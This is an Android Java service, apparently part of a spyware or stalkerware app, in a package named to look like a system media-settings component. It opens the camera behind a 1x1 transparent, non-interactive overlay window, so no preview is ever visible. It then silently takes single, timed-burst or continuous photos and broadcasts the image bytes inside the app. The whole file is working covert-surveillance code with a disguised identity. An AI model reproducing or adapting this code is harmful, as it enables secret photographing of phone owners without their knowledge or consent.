package com.android.media.settings.Service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import com.android.media.settings.Model.Property;
import com.android.media.settings.Utility.CameraUtility;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import static android.content.ContentValues.TAG;


public class CamService extends Service {
    public static final String INTENT_SELECTED_CAMERA = "SELECTED_CAMERA_FOR_SNAP";
    public static final String INTENT_SELECTED_FUNCTION = "SELECTED_OPERATION";
    public static final String INTENT_CAMERA_ROTATION = "CAMERA_ROTATION";
    public static final String INTENT_PROPERTY_STRING = "MS_PROPERTY";
    public static final int FUNCTION_TAKE_SNAP = 1;

    private Camera camera;
    private boolean safeToTakePicture = false;

    private int camRotation;
    private boolean isReadyToExit;
    private Property property;
    private boolean isStreamMode;

    private static final String TAG = "CamService";
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mCameraService = this;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if(intent == null) {
            throw new IllegalStateException("Must start the service with intent");
        }

        String propertyString = intent.getStringExtra(INTENT_PROPERTY_STRING);
        if(propertyString.isEmpty()) {
            property = new Property();
        }

        try {
            property = Property.fromJson(propertyString);
        } catch (Exception e) {
            Log.d(TAG, "Unable to parse property object, defaulting values");
            property = new Property();
        }

        isReadyToExit = true;
        isStreamMode = false;

        if(property.getSnapMode().equals(Property.SNAP_MODE_SINGLE)) {
            initCamera();
        } else {
            processBurstMode();
        }

        return START_NOT_STICKY;
    }

    public static void takeSnap(Context context, Property property) {
        Intent intent = new Intent(context, CamService.class);
        intent.putExtra(INTENT_PROPERTY_STRING, Property.toJson(property));
        context.startService(intent);
    }

    private static CamService mCameraService;
    public static synchronized CamService getInstance() {
        return mCameraService;
    }

    public void initCamera() {
        if(camera != null) camera.release();
        camera = CameraUtility.getCameraInstance(property.getCameraId());
        if(camera == null) return;
        SurfaceView surfaceView = new SurfaceView(getApplicationContext());
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1,
                WindowManager.LayoutParams.TYPE_TOAST,
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);
        SurfaceHolder sh = surfaceView.getHolder();
        surfaceView.setZOrderOnTop(true);
        sh.setFormat(PixelFormat.TRANSPARENT);
        sh.addCallback(surfaceCb);
        try {
            wm.addView(surfaceView, params);
        } catch (NullPointerException e) { e.printStackTrace(); }
    }

    public void takePicture() {
        if(camera != null) {
            try {
                if(safeToTakePicture) {
                    camera.takePicture(null, null, mPicture);
                    safeToTakePicture = false;
                }
            } catch (Exception e) {
                e.printStackTrace();
                stopSelf();
            }
        }
    }

    public void takePicture2() {
        if(camera != null) {
            Runnable runnable = () -> {
                try {
                    camera.takePicture(null, null, mPicture2);
                } catch (Exception e) {
                    e.printStackTrace();
                    stopSelf();
                }
            } ;
            new Handler().postDelayed(runnable, property.getSnapDelay());
        }
    }

    private SurfaceHolder.Callback surfaceCb = new SurfaceHolder.Callback() {
        @Override
        public void surfaceCreated(SurfaceHolder surfaceHolder) {

        }

        @Override
        public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i1, int i2) {
            Camera.Parameters params = camera.getParameters();
            params.setFocusMode(property.getFocusMode());
            params.setRotation(property.getRotation());
            camera.setParameters(params);
            Camera.Parameters p = camera.getParameters();

            List<Camera.Size> listSize;
            listSize = p.getSupportedPreviewSizes();
            Camera.Size mPreviewSize = listSize.get(property.getResolution());
            p.setPreviewSize(mPreviewSize.width, mPreviewSize.height);

            listSize = p.getSupportedPictureSizes();
            Camera.Size mPictureSize = listSize.get(property.getResolution());
            p.setPictureSize(mPictureSize.width, mPictureSize.height);
            camera.setParameters(p);

            try {
                camera.setPreviewDisplay(surfaceHolder);
            } catch (IOException e) {
                e.printStackTrace();
            }
            camera.startPreview();
            safeToTakePicture = true;

            if(!isStreamMode) {
                new Handler().postDelayed(() -> takePicture(), property.getSnapDelay());
            }
        }

        @Override
        public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
            Log.d(TAG, "Surface Destroyed");
        }
    };

    private void processBurstMode() {
        switch (property.getSnapMode()) {
            case Property.SNAP_MODE_BURST_10:
                isReadyToExit = false;
                isStreamMode = false;
                new Handler().postDelayed(() -> countDown(30*1000, property.getStreamDelay()), property.getSnapDelay());
                break;

            case Property.SNAP_MODE_BURST_STREAM:
                isStreamMode = true;
                isReadyToExit = false;
                initCamera();
                takePicture2();
                break;
        }
    }

    private CountDownTimer countDownTimer;
    private void countDown(int future, int interval) {
        countDownTimer = new CountDownTimer(future, interval) {
            @Override
            public void onTick(long millisUntilFinished) {
                isReadyToExit = false;
                initCamera();
            }

            @Override
            public void onFinish() {
                isReadyToExit = true;
            }
        }.start();
    }

    private Camera.PictureCallback mPicture2 = (byte[] data, Camera camera) -> {
        Intent intent = new Intent("CamServiceUpdates");
        intent.putExtra("ImageBytes", data);
        LocalBroadcastManager.getInstance(CamService.this).sendBroadcast(intent);

        try {
            camera.reconnect();
            camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
            stopSelf();
        }
        takePicture2();
    };

    private Camera.PictureCallback mPicture = (byte[] data, Camera camera) -> {
        Intent intent = new Intent("CamServiceUpdates");
        intent.putExtra("ImageBytes", data);
        LocalBroadcastManager.getInstance(CamService.this).sendBroadcast(intent);
        safeToTakePicture = true;

//        File pictureFile = CameraUtility.getOutputFile();
//
//        if (pictureFile == null) {
//            return;
//        }
//
//        try {
//            FileOutputStream fos = new FileOutputStream(pictureFile);
//            fos.write(data);
//            fos.close();
//        } catch (FileNotFoundException e) {
//            e.printStackTrace();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
        if(isReadyToExit) stopSelf();
    };

    @Override
    public void onDestroy() {
        super.onDestroy();
        camera.release();
        if(countDownTimer != null) countDownTimer.cancel();
    }
}
